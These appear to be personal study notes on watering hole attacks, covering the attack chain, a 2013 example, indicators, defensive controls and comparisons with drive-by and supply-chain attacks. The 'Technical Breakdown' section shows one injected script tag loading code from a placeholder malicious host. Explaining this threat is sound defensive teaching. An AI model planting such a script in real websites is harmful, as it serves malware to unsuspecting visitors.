# Watering Hole Attacks
A **watering hole attack** is when an attacker compromises a legitimate website that a specific group of users regularly visit in order to infect or spy on that group.

Predators wait at the watering hole where prey gathers - they don't chase every animal, they strike where the targets come to them.

---
### How It Fits Into Earlier Topic
- It's a **[[20-Common-Threat-Vectors#Email and Social Engineering|social engineering]]-adjacent** attack; it relies on **trust and normal behavior**, like [[21-Phishing|Phishing]] does but there's no direct interaction with the victim
- It's a **web-based** threat vector (like drive-by downloads), targeting **[[02-The-CIA-Triad#Availability|Availability]] and [[02-The-CIA-Triad#Integrity|Integrity]]** of a trusted site
- It exploits the human tendency to trust known resources, similar to supply chain attacks, bu through web infrastructure instead of vendor software

---
### The Attack Chain
| Phase          | Description                                                               | Security Concept                                                                         |
| -------------- | ------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------- |
| Reconnaissance | Attacker studies target organization: employees, industry, sites, vendors | Threat intelligence / OSNIT                                                              |
| Selection      | Chooses a popular website visited by that target group                    | Risk analysis (where the target's surface is)                                            |
| Compromise     | Exploits a vulnerability in that website's code or CMS                    | Web server hardening / patch management                                                  |
| Injection      | Inserts malicious JavaScript or iframe into site                          | Integrity breach                                                                         |
| Delivery       | Visitors to the site are silently redirected or served malware (drive-by) | [[14-Encryption-Technologies#Data In Transit (Across Networks)\|Data In Transit]] attack |
| Exploitation   | Malware infects target systems (esp. unpatched browsers or plug-ins)      | Endpoint security / patching                                                             |
Phishing = Attackers reach out to victims
Watering hold = Attackers wait for victim to come to them

---
### Real-World Example
- In 2013, attackers compromised the U.S. Department of Labor website to infect visitors working in nuclear research sectors
- Visitors were silently redirected to a site hosting a zero-day Internet Explorer exploits

---
### What Makes It Dangerous
| Factor              | Explaination                                                             |
| ------------------- | ------------------------------------------------------------------------ |
| Trust abuse         | Victims trust the site (it's legitimate)                                 |
| Low detection       | Site continues normal operation: admins often unaware                    |
| Targeted efficiency | Attacker doesn't spam the world - only those in specific industries      |
| Chained exploits    | Often uses zero-days, privilege escalation, or C2 beacons post-infection |

---
### Defensive Controls
| Control Type                                                                           | Measures                                                                                                                     | Related Concepts                        |
| -------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- | --------------------------------------- |
| [[01-Security-Controls#Control Implementation Types (How they're applied)\|Technical]] | - Regular patching (browsers, plugins)<br>- Web content filtering / DNS filtering<br>- Network segmentation (contain spread) | System hardening / defense in depth     |
| [[01-Security-Controls#Control Types by Function\|Detection]]                          | - Intrusion detection / prevention systems (IDS/IPS)<br>- Endpoint protection (Behavioral analysis)                          | Monitoring / Continuous controls        |
| [[01-Security-Controls#Control Types by Function\|Administrative]]                     | - Threat intelligence sharing<br>- User awareness: "trusted" sites can be compromised                                        | Security awareness / Risk communication |
| [[01-Security-Controls#Control Types by Function\|Response]]                           | - Isolate affected hosts<br>- Validate site integrity and notify provider                                                    | Incident response procedures            |
This is where [[09-Change-Management|change management]] and [[02-The-CIA-Triad#Integrity|integrity]] monitoring (hash checks, WAF logs) support security controls

---
### Indicators Of A Watering Hole Attack
- Sudden malware alerts when visiting one specific site
- Unusual outbound traffic to command-and-control (C2) domains
- Changes in web content or injected scripts on legitimate domains
- Multiple users reporting infection from same external site

[[16-Hashing-&-Digital-Signatures]] can detect unauthorized changes in web files as well.

---
### Technical Breakdown
A common watering hole compromise looks like this:
```
<script src="http://malicious-site.example/redirect.js"></script>
```

That small snippet (injected via SQLi, CMS plugin vulnerability, or stolen credentials) executes on client browsers:
1. Performs browser fingerprinting (detects versions)
2. Uses exploit kit to deliver malware payload (e.g., via Flash/ActiveX/JS exploit)
3. Establishes C2 channel back to attacker

This chain connects to earlier crypto topics:
- Payloads might install a **keylogger** or ex-filtrate [[18-Certificates|certificates]] or hashes, undermining integrity
- Post-exploitation could include credential harvesting (breaking authentication)

---
### Watering Hole vs Drive-By vs Supply Chain
| Attack Type                                                                   | Description                                                   | Key Difference                               |
| ----------------------------------------------------------------------------- | ------------------------------------------------------------- | -------------------------------------------- |
| Watering Hole                                                                 | Compromise of a site frequented by target users               | Targeted audience                            |
| [[20-Common-Threat-Vectors#Web-Based Threats\|Drive-By Download]]             | Infection when visiting any malicious or compromised site     | Opportunistic - not targeted                 |
| [[20-Common-Threat-Vectors#Supply Chain & Third-Party Threats\|Supply Chain]] | Compromise of vendor or update system to affect may customers | Indirect attack through trust in third party |
Site visited frequently compromised = Watering hole
Software update compromised = Supply chain
Random website infecting users = Drive-By

---
### Prevention Summary
| Layer             | Mitigation Example                                  |
| ----------------- | --------------------------------------------------- |
| Network Layer     | DNS filtering, proxy inspection, IDS/IPS signatures |
| Host Layer        | Patch browsers, disable scripts, EDR                |
| Application Layer | Web Application Firewall (WAF), input validation    |
| User Layer        | Awareness: even trusted sites can be compromised    |
